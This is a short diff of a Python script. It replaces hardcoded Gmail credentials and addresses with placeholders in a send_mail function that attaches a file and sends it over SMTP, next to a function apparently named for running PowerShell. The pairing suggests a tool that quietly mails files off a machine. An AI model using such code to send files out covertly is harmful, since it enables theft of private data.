@@ -38,8 +38,8 @@ def exec_ps():
 
 
 def send_mail(sender,receiver):
-	from_mail = sender
-	to_mail   = receiver
+	from_mail = <sender mail>
+	to_mail   = <receiver mail>
 	message   = MIMEMultipart() 
 	message['From'] = from_mail
 	message['To'] = to_mail
@@ -56,7 +56,7 @@ def send_mail(sender,receiver):
 	message.attach(getFile) 
 	smtp = smtplib.SMTP('smtp.gmail.com', 587) 
 	smtp.starttls() 
-	smtp.login(from_mail, "<password_is_here>") 
+	smtp.login(from_mail, <password>) 
 	text = message.as_string() 
 	smtp.sendmail(from_mail, to_mail, text) 
 	smtp.quit() 
